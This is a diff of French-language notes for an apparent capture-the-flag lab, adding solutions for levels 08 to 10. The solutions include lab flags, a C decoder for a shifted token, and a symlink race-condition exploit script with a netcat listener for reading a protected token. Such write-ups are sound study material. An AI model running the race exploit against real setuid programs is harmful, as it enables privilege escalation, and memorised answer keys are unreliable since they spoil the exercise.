@@ -7,6 +7,18 @@ login: level00
 Password: level00
 ```
 
+pour passer a un autre level 
+```c
+su levelxx
+```
+
+pour entrer un flag
+```c
+su flagxx
+```
+
+
+
 level00
 
 Definitions :
@@ -321,8 +333,116 @@ Créer un lien symbolique pointant vers le fichier protégé (token).
 ```
 
 su flag08 puis getflag
+flag: 25749xKZ8L7DkSCwJkT9dyv6f
 
+
+-------------------------------
 level09
+
+ls -la 
+
+```c
+./level09 abcd
+```
+
+on a vue un decalage donc on a creer un programme qui stop le decalage
+
+```c
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+    int i;
+
+    i = 0;
+
+    if (argc != 2)
+        return 1;
+    while (argv[1][i])
+    {
+        printf("%c", argv[1][i] -i);
+        i++;
+    }
+}
+```
+
+puis on a lancer la commande 
+```c
+cd /tmp
+gcc decode.c  -o decode
+cd 
+cat token | xargs /tmp/decode
+xargs prend l’entrée de la commande précédente (ici cat token) et la passe comme argument au programme que tu indiques (/tmp/decode).
+```
+
+
+flag: s5cAJpM8ev6XHw998pRWG728z
+
+---------------------
+
+level10 
+
+recupere l'executable 
+dans un terminal neutre
+```c
+scp -P 4242 level10@10.11.248.91:/home/user/level10/level10 /tmp/level10
+```
+
+envoyer le fichier a dogbolt
+
+on a analyser le fichier :
+
+Le programme vérifie d’abord les droits d’accès au fichier avec access(), puis ouvre le fichier plus tard avec open().
+
+Cela crée une fenêtre de vulnérabilité : on peut remplacer le fichier entre les deux appels (race condition) et forcer le binaire à lire le token.
+
+```c
+while true; do nc.traditional -l -p 6969 | grep -v '.*( )*.' ; done
+```
+Ici on atten que le programme level10 envoie le contenu du fichier token.
+
+vim /tmp/getflag.sh
+
+
+```c
+#!/bin/bash
+
+random_file=$(mktemp /tmp/fileXXXX)   # fichier temporaire vide
+link_name=$(mktemp -u /tmp/linkXXXX) # nom de lien temporaire
+
+# Boucle qui exécute level10 en continu
+while true; do
+    /home/user/level10/level10 $link_name 127.0.0.1 &>/dev/null
+done &
+
+# Boucle qui change rapidement le lien symbolique
+while true; do
+    ln -fs /home/user/level10/token $link_name
+    ln -fs $random_file $link_name
+done
+```
+
+
+on le rends executable
+```c
+chmod +x /tmp/getflag.sh
+```
+
+dans le terminal2
+
+```c
+/tmp/getflag.sh
+```
+
+dans le terminal on recupe le mot de passe.
+
+flag: feulo4b72j7edeahuete3no7c
+
+-----------------
+
+level11 
+
+
 
 
 
